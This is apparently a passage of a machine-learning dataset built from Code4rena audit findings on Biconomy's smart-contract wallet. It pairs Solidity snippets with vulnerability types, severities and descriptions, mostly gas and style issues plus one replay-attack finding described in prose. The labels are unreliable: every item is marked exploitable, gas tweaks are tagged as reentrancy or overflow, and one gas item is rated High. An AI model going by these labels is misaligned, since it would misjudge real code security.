    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.613,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n53:     // uint96 private _nonce; //changed to 2D nonce below\n\n201:    //console.log(\"init %s\", 21000 + msg.data.length * 8);\n\n235:    // uint256 extraGas;\n\n237:    //console.log(\"sent %s\", startGas - gasleft());\n\n238:    // extraGas = gasleft();\n\n242:    // extraGas = extraGas - gasleft();\n\n243:    //console.log(\"extra gas %s \", extraGas);\n\n255:    // uint256 startGas = gasleft();\n\n267:    // uint256 requiredGas = startGas - gasleft();\n\n268:    //console.log(\"hp %s\", requiredGas);\n\n292:    //console.log(\"hpr %s\", requiredGas);\n\n293:    // Convert response to string and return via error message\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[NC-1] Commented code lines",
    "description": "Remove commented code lines for code clarity. _Instances (12)_: File: contracts/smart-contract-wallet/SmartAccount.sol 53:     // uint96 private _nonce; //changed to 2D nonce below 201:    //console.log(\"init %s\", 21000 + msg.data.length * 8);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.668,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n\"@openzeppelin/contracts\": \"^4.7.3\",\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-01] Use the latest version of OpenZeppelin",
    "description": "To prevent any issues in the future (e.g. using solely hardhat to compile and deploy the contracts), upgrade the used OZ packages within the package.json to the latest versions. \"@openzeppelin/contracts\": \"^4.7.3\",",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.046,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    receive() external payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-02] Unused/empty receive()/fallback() function",
    "description": "Sometimes Ether might be mistakenly sent to the contract. It's better to prevent this from happening. smartAccount.sol If the intention is for the Ether to be used, the function should call another function, otherwise it should revert If a method does not have an external call then it is impossible to reenter, so you can skip this modifier in such methods File: SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.043,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\naddress payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-03] Avoid the use of tx.origin",
    "description": "The tx.origin environment variable has been found to influence a control flow decision. Note that using tx.origin as a security control might cause a situation where a user inadvertently authorizes a smart contract to perform an action on their behalf. It is recommended to use msg.sender instead. File: SmartAccount.sol address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver; Lines of code: - https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L257",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.104,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nevent ImplementationUpdated(address _scw, string version, address newImplementation);\nevent EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "\\[NC-01\\] Event is missing indexed fields",
    "description": "Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed. File: SmartAccount.sol event ImplementationUpdated(address _scw, string version, address newImplementation); event EntryPointChanged(address oldEntryPoint, address newEntryPoint); Lines of code:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.166,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n    L121             inverse *= 2 - denominator * inverse; // inverse mod 2^8\n    L122             inverse *= 2 - denominator * inverse; // inverse mod 2^16\n    L123              inverse *= 2 - denominator * inverse; // inverse mod 2^32\n    L124              inverse *= 2 - denominator * inverse; // inverse mod 2^64\n    L125              inverse *= 2 - denominator * inverse; // inverse mod 2^128\n    L126              inverse *= 2 - denominator * inverse; // inverse mod 2^256\n    L148              result += 1;\n    L210                  result += 128;\n    L214                  result += 64;\n    L218                  result += 32;\n    L222                  result += 16;\n    L226                  result += 8;\n    L230                  result += 4;\n    L234                  result += 2;\n    L237                  result += 1;\n    L262                  value /= 10**64;\n    L263                  result += 64;\n    L266                  value /= 10**32;\n    L267                  result += 32;\n    L270                  value /= 10**16;\n    L271                  result += 16;\n    L274                  value /= 10**8;\n    L275                  result += 8;\n    L278                  value /= 10**4;\n    L279                  result += 4;\n    L282                  value /= 10**2;\n    L283                  result += 2;\n    L286                  result += 1;\n    L314                  result += 16;\n    L318                  result += 8;\n    L322                   result += 4;\n    L326                  result += 2;\n    L329                result += 1;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "2. contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol",
    "description": "L71           UserOpInfo[] memory opInfos = new UserOpInfo[](opslen); L104           UserOpInfo[] memory opInfos = new UserOpInfo[](totalOps); L171        MemoryUserOp memory mUserOp = opInfo.mUserOp; L229          UserOpInfo memory outOpInfo; L234                StakeInfo memory paymasterInfo = getStakeInfo(outOpInfo.mUserOp.paymaster);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "bash\n$ npx hardhat test\n127181000000000000\n    \u2713 can send transactions and charge wallet for fees in erc20 tokens\n\n\u00b7----------------------------------------------------------|---------------------------|-------------|-----------------------------\u00b7\n|                   Solc version: 0.8.12                   \u00b7  Optimizer enabled: true  \u00b7  Runs: 200  \u00b7  Block limit: 30000000 gas  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  Methods                                                                                                                         \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  Contract                 \u00b7  Method                      \u00b7  Min        \u00b7  Max        \u00b7  Avg        \u00b7  # calls      \u00b7  usd (avg)  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  DepositPaymaster         \u00b7  addDepositFor               \u00b7      66363  \u00b7      83415  \u00b7      72051  \u00b7            3  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  DepositPaymaster         \u00b7  addStake                    \u00b7          -  \u00b7          -  \u00b7      82651  \u00b7            1  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  DepositPaymaster         \u00b7  addToken                    \u00b7          -  \u00b7          -  \u00b7      46832  \u00b7            1  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  EntryPoint               \u00b7  addStake                    \u00b7      31542  \u00b7      68542  \u00b7      44809  \u00b7            3  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  EntryPoint               \u00b7  depositTo                   \u00b7      28863  \u00b7      45963  \u00b7      40259  \u00b7            3  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  EntryPoint               \u00b7  handleAggregatedOps         \u00b7     163341  \u00b7     345337  \u00b7     245824  \u00b7            6  \u00b7          -  \u2502\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n|  EntryPoint               \u00b7  handleOps                   \u00b7     101621  \u00b7     507653  \u00b7     256367  \u00b7           28  \u00b7          -  \u2502\n95 passing (2m)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## GAS-1: Consider using IR Cogen compiler pipeline for gas optimization",
    "description": "- Description: The IR-based code generator was introduced with an aim to not only allow code generation to be more transparent and auditable but also to enable more powerful optimization passes that span across functions. - Location: Project Wide - Proof of Gas savings: Enabling {viaIR: true} in the compiler settings will enable the IR-based code generator. This will allow the compiler to use more powerful optimization passes that span across functions. The gas savings will be in the range of 5-10%. $ npx hardhat test 127181000000000000",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: aa-4337/core/EntryPoint.sol\n\n100:      for (uint256 i = 0; i < opasLen; i++) {\n\n107:      for (uint256 a = 0; a < opasLen; a++) {\n\n112:      for (uint256 i = 0; i < opslen; i++) {\n\n114:      opIndex++;\n\n128:      for (uint256 a = 0; a < opasLen; a++) {\n\n134:      for (uint256 i = 0; i < opslen; i++) {\n\n136:      opIndex++;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "[GAS-1] ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop. *Instances (7)*: File: aa-4337/core/EntryPoint.sol 100:      for (uint256 i = 0; i < opasLen; i++) { 107:      for (uint256 a = 0; a < opasLen; a++) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.341,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nBecause the check [line 171](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L171) ensures that we always have ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Risk : NON CRITICAL",
    "description": "In the `init` function from the `SmartAccount` the following check is redundant : File: SmartAccount.sol [Line 174](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L174) if (_handler != address(0)) internalSetFallbackHandler(_handler); Because the check [line 171](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L171) ensures that we always have `_handler != address(0)` and so the `internalSetFallbackHandler` should be called immediatly and the if statement should be removed.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.185,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction isContract(address account) internal view returns (bool) {\n    uint256 csize;\n    // solhint-disable-next-line no-inline-assembly\n    assembly { csize := extcodesize(account) }\n    return csize != 0;\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "There is 1 instance of this issue : File: libs/LibAddress.sol [Line 11-16](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol#L11-L16) function isContract(address account) internal view returns (bool) { uint256 csize; // solhint-disable-next-line no-inline-assembly",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.212,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\nfile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol, line 168 - 190\n\n+   function innerHandleOp(bytes calldata callData, UserOpInfo calldata opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\n-   function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\n        uint256 preGas = gasleft();\n        require(msg.sender == address(this), \"AA92 internal call only\");\n+       MemoryUserOp calldata mUserOp = opInfo.mUserOp;\n-       MemoryUserOp memory mUserOp = opInfo.mUserOp;\n\n        IPaymaster.PostOpMode mode = IPaymaster.PostOpMode.opSucceeded;\n        if (callData.length > 0) {\n\n            (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);\n            if (!success) {\n                if (result.length > 0) {\n                    emit UserOperationRevertReason(opInfo.userOpHash, mUserOp.sender, mUserOp.nonce, result);\n                }\n                mode = IPaymaster.PostOpMode.opReverted;\n            }\n        }\n\n    unchecked {\n        uint256 actualGas = preGas - gasleft() + opInfo.preOpGas;\n        //note: opIndex is ignored (relevant only if mode==postOpReverted, which is only possible outside of innerHandleOp)\n        return _handlePostOp(0, mode, opInfo, context, actualGas);\n    }\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-02] USE CALLDATA INSTEAD OF MEMORY IN `innerHandleOp()`",
    "description": "Using the `memory` keyword instead of `calldata` in the `innerHandleOp()` function in `EntryPoint.sol` is possible and can potentially reduce gas costs. The recommended changes are outlined below. _instance (1)_: file: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol, line 168 - 190 +   function innerHandleOp(bytes calldata callData, UserOpInfo calldata opInfo, bytes calldata context) external returns (uint256 actualGasCost) { -   function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nfile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol, line 145 - 154\n\n    struct MemoryUserOp {\n        address sender;\n+       address paymaster;\n        uint256 nonce;\n        uint256 callGasLimit;\n        uint256 verificationGasLimit;\n        uint256 preVerificationGas;\n-       address paymaster;\n        uint256 maxFeePerGas;\n        uint256 maxPriorityFeePerGas;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] REORDER STRUCTURE LAYOUR TO SAVE SLOT STORAGES",
    "description": "The layout of the following structs could be optimized by rearranging the positions of certain values in order to reduce the number of storage slots required. This would lead to a more efficient use of storage resources and potentially lower gas costs for interactions involving these structs. _instance (3)_: file: contracts/smart-contract-wallet/BaseSmartAccount.sol, line 12 - 18 struct Transaction {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.393,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_validateAndUpdateNonce",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "1. Validation of the `validateUserOp` method is susceptible to replay attacks",
    "description": "Summary: The `validateUserOp` method in the `BaseSmartAccount` contract is susceptible to replay attacks. The method does not check for a replay protection mechanism, such as a nonce or a timestamp, and only updates the nonce if the `initCode` field of the `UserOperation` struct is empty. This allows an attacker to potentially reuse a previously signed `UserOperation` struct in a new transaction, potentially causing unintended consequences. Impact: An attacker could potentially reuse a previously signed `UserOperation` struct in a new transaction, potentially causing unintended consequences. This could lead to loss of funds or other unintended consequences. Recommendation: It is recommended to implement a replay protection mechanism, such as a nonce or a timestamp, in the `validateUserOp` method to prevent replay attacks. This can be done by checking the current nonce or timestamp in the `_validateAndUpdateNonce` function and only updating the nonce or timestamp if it is valid.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
